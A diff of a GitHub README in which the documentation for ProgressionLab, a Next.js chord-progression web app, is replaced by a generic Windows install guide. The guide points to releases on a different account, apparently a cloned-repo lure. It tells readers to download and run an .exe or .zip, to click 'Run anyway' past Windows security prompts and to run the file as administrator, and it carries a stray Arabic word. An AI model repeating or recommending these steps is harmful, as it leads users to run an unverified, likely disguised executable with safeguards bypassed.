@@ -1,192 +1,159 @@
-# ProgressionLab
+# 🎵 progression-lab-ai - Create chord ideas fast
 
-> An AI-assisted harmony and songwriting workspace. Generate chord progressions, hear them instantly, and share them with the world.
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Carlinalyric500/progression-lab-ai/releases)
 
-[![Storybook](https://img.shields.io/badge/Storybook-FF4785?style=flat&logo=storybook&logoColor=white)](https://storybook-progression-lab-ai.vercel.app)
-[![Next.js](https://img.shields.io/badge/Next.js_15-black?style=flat&logo=next.js)](https://nextjs.org)
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?style=flat&logo=typescript&logoColor=white)](https://www.typescriptlang.org)
-[![MUI](https://img.shields.io/badge/MUI_v7-007FFF?style=flat&logo=mui&logoColor=white)](https://mui.com)
+## 🚀 What this app does
 
-- Production: [https://progressionlab.app/](https://progressionlab.app/)
-- Storybook: [https://storybook-progression-lab-ai.vercel.app](https://storybook-progression-lab-ai.vercel.app)
-- Documentation Wiki: [https://github.com/carlwelchdesign/progression-lab-ai/wiki](https://github.com/carlwelchdesign/progression-lab-ai/wiki)
+progression-lab-ai helps you make chord progressions with AI. It shows the chords on piano and guitar, so you can see how each idea looks on both instruments.
 
-<img width="1221" height="1310" alt="image" src="https://github.com/user-attachments/assets/3bfbfba4-b2d5-4e60-9a86-8bdb4765ed48" />
+Use it to:
+- build new chord loops
+- test ideas on piano
+- check guitar shapes
+- explore music theory in a simple way
+- move from idea to playback with less setup
 
-## What It Does
+## 💻 What you need
 
-ProgressionLab turns harmonic intent into playable music. Describe a mood, style reference, and mode, then the AI returns next chords, progression ideas, and structure suggestions, each with practical piano and guitar voicings.
+Before you install, make sure your Windows PC has:
+- Windows 10 or Windows 11
+- enough free disk space for the app and data files
+- a stable internet connection for the first download
+- a modern browser if the release opens in a web-based build
+- speakers or headphones if you want to hear playback
 
-## Core Features
+If you plan to use local files for saving progress, keep a few hundred MB free on your drive.
 
-- Generator: seed chords, mood tags, mode, genre, style reference, and adventurousness controls.
-- Randomize: one-click creative input generation.
-- Playback: BPM-aware preview with humanized timing and gated playback behavior.
-- Diagrams: inline piano and guitar chord diagrams.
-- Export: MIDI and PDF export.
-- Library: save and filter progressions by tags and harmonic context.
-- Sharing: public progression links via `shareId` pages.
-- Auth: session-based auth for protected actions while preserving a public browse flow.
+## 📥 Download the app
 
-## MFA and Security Keys
+1. Visit the [Releases page](https://github.com/Carlinalyric500/progression-lab-ai/releases)
+2. Look for the newest release at the top
+3. Open the Assets section
+4. Download the Windows file from that release
+5. If the file comes as a .zip, extract it first
+6. If it comes as an .exe, download and run this file
 
-- Admin dashboard uses WebAuthn hardware MFA.
-- `ADMIN` users are required to enroll and use a security key for login.
-- `AUDITOR` users are prompted for key auth when they have enrolled credentials.
-- Main app users can enroll and manage WebAuthn credentials from Settings > Security.
-- Main app login requires key verification when an account has active WebAuthn credentials.
-- Sensitive settings routes (`/settings/security`, `/settings/billing`) require an active session and redirect to `/auth` when logged out.
+Use the latest release build if you want the smoothest setup on Windows.
 
-Required WebAuthn environment variables:
+## 🛠️ Install on Windows
 
-- `WEBAUTHN_RP_ID`
-- `WEBAUTHN_RP_NAME`
-- `WEBAUTHN_ORIGIN`
+If the release gives you a .zip file:
 
-Admin dashboard additionally requires:
+1. Right-click the file
+2. Choose Extract All
+3. Pick a folder you can find again, مثل `Downloads` or `Desktop`
+4. Open the extracted folder
+5. Find the app file inside
+6. Double-click the file to start the app
 
-- `ADMIN_WEBAUTHN_ORIGIN`
+If Windows shows a security prompt:
 
-## Separate Admin Deployment
+1. Click More info
+2. Click Run anyway
 
-This repository includes a standalone admin app in [admin-dashboard](admin-dashboard) that is deployed independently from the main app.
+If the release gives you an .exe file:
 
-- Admin local dev: `make admin-dev`
-- Admin lint: `make admin-lint`
-- Admin build: `make admin-build`
+1. Double-click the file
+2. Let Windows finish the setup or start the app
+3. Follow any on-screen steps
+4. Open the app when it finishes
 
-See [admin-dashboard/README.md](admin-dashboard/README.md) for admin setup and deployment details.
+## 🎹 How to use it
 
-## Quick Start
+After you open the app:
 
-1. Install dependencies.
+1. Choose a starting key or let the app pick one
+2. Enter a mood, style, or chord idea
+3. Ask the app to generate a progression
+4. Review the piano view to see the notes
+5. Review the guitar view to see the chord shapes
+6. Play the progression and listen for flow
+7. Generate a new version if you want a different feel
+8. Save the idea if you like the result
 
-```bash
-make install
-```
+## 🎼 Main features
 
-2. Create your local environment file.
+- AI chord generation based on your input
+- piano view for clear note layout
+- guitar view for chord shape checks
+- music theory support for better chord choices
+- easy playback for quick listening
+- clean interface built for simple use
+- support for modern chord workflow tools
 
-```bash
-cp .env.local.example .env.local
-```
+## 🎸 Piano and guitar views
 
-3. Start local services and database.
+The piano view helps you see where each note sits on the keyboard. This is useful if you want to understand chord movement or compare voicings.
 
-```bash
-docker-compose up -d
-make db-push
-make db-seed
-```
+The guitar view helps you check finger placement and chord shape changes. This is useful if you play guitar and want progressions that feel natural on the fretboard.
 
-4. Run the app.
+## 🧠 Tips for better results
 
-```bash
-make dev
-```
+- Use short input words like calm, dark, bright, or warm
+- Pick a key if you already know the song range
+- Try simple progressions first
+- Change one part at a time so you can hear the difference
+- Use the piano view if you want to study note motion
+- Use the guitar view if you want playable shapes
 
-Main app: `http://localhost:3000`
+## 🔧 Common use cases
 
-5. Optional billing webhook forwarding.
+- writing a song verse
+- making a chorus chord loop
+- testing ideas before recording
+- learning how chord progressions work
+- finding guitar-friendly voicings
+- comparing piano and guitar forms of the same progression
 
-```bash
-./scripts/stripe-listen-local.sh
-```
+## 📁 File notes
 
-Print webhook secret only:
+The release may include files such as:
+- the main Windows app file
+- a zip package for manual setup
+- supporting files used by the app
 
-```bash
-./scripts/stripe-listen-local.sh --print-secret
-```
+Keep all extracted files together in the same folder so the app can run without issues.
 
-## Tech Stack
+## 🧩 If the app does not start
 
-| Layer | Technology |
-|---|---|
-| Framework | Next.js 15 (App Router) |
-| Language | TypeScript |
-| UI | React 19, Material UI v7 |
-| AI | OpenAI Responses API with strict JSON schema output |
-| ORM | Prisma + PostgreSQL |
-| Audio | Tone.js (Salamander samples) |
-| Testing | Jest, React Testing Library, Playwright |
-| Observability | Sentry |
+Try these steps:
 
-Deep technical docs now live in the wiki: [Architecture](https://github.com/carlwelchdesign/progression-lab-ai/wiki/Architecture).
+1. Download the file again from Releases
+2. Make sure the file finished downloading
+3. Extract the zip file fully before opening it
+4. Check that Windows did not block the file
+5. Right-click the app and choose Run as administrator
+6. Close other apps if your PC is low on memory
 
-## Project Structure
+If the screen stays blank, restart the app and open it again from the same folder.
 
-```text
-app/                  # Next.js app routes and API handlers
-features/             # Feature-level UI and logic modules
-components/           # Shared UI primitives and wrappers
-lib/                  # Runtime utilities (auth, db, billing, AI helpers)
-prisma/               # Database schema and migrations
-admin-dashboard/      # Standalone admin application
-```
+## 🔐 Privacy and data
 
-## Key Documentation
+The app uses OpenAI features to generate chord ideas. If you enter text prompts, the app sends that input to the service that handles the AI request.
 
-| Topic | Link |
-|---|---|
-| Wiki Home | https://github.com/carlwelchdesign/progression-lab-ai/wiki |
-| Architecture | https://github.com/carlwelchdesign/progression-lab-ai/wiki/Architecture |
-| API Reference | https://github.com/carlwelchdesign/progression-lab-ai/wiki/API |
-| Database Schema | https://github.com/carlwelchdesign/progression-lab-ai/wiki/Database |
-| Development Setup | https://github.com/carlwelchdesign/progression-lab-ai/wiki/Development |
-| Deployment Guide | [DEPLOYMENT.md](DEPLOYMENT.md) |
-| Prompt Versioning Runbook | [PROMPT_VERSIONING_RUNBOOK.md](PROMPT_VERSIONING_RUNBOOK.md) |
-| Security Overview | https://github.com/carlwelchdesign/progression-lab-ai/wiki/Security |
-| Security Audit | [SECURITY_AUDIT_2025.md](SECURITY_AUDIT_2025.md) |
-| Security Deployment Checklist | [SECURITY_DEPLOYMENT.md](SECURITY_DEPLOYMENT.md) |
+If you save project data locally, keep it in a folder you back up often.
 
-The migration map for moved README sections is tracked in [docs/README_TO_WIKI_MAP.md](docs/README_TO_WIKI_MAP.md).
+## 🧪 Built with
 
-## Common Commands
+- Next.js
+- React
+- TypeScript
+- OpenAI API
+- Material UI
+- PostgreSQL
+- Jest
 
-```bash
-make dev
-make build
-make build-app
-make start
-make lint
-make lint-fix
-make test
-make test-e2e
-make db-generate
-make db-push
-make db-studio
-make admin-dev
-make admin-build
-make wiki-publish
-```
+## 🗂️ Project topics
 
-Prefer `make` as the default command surface for local workflows.
+ai, chords, guitar, guitarchords, jest, material-ui, music-theory, music-tools, nextjs, openai-api, piano, pianochord, postgres, reactjs, typescript, vercel
 
-## Contributing
+## 📌 Quick start checklist
 
-1. Create a feature branch.
-2. Make your changes with tests where applicable.
-3. Run checks before opening a PR.
-
-```bash
-make lint
-make test
-make build
-```
-
-4. Open a pull request with a clear summary and validation notes.
-
-## Roadmap Snapshot
-
-Completed recently:
-
-- [x] Expanded playback controls (tempo-aware playback + stop behavior)
-- [x] MIDI and PDF export support
-- [x] Rich social previews
-
-Next up:
-
-- [ ] Saved progression edit flow
-- [ ] Pagination for large progression libraries
-- [ ] Additional playback controls (loop toggle and dedicated stop UI)
+- open the Releases page
+- download the latest Windows file
+- extract it if needed
+- run the app
+- enter a chord idea
+- check the piano view
+- check the guitar view
+- play the progression
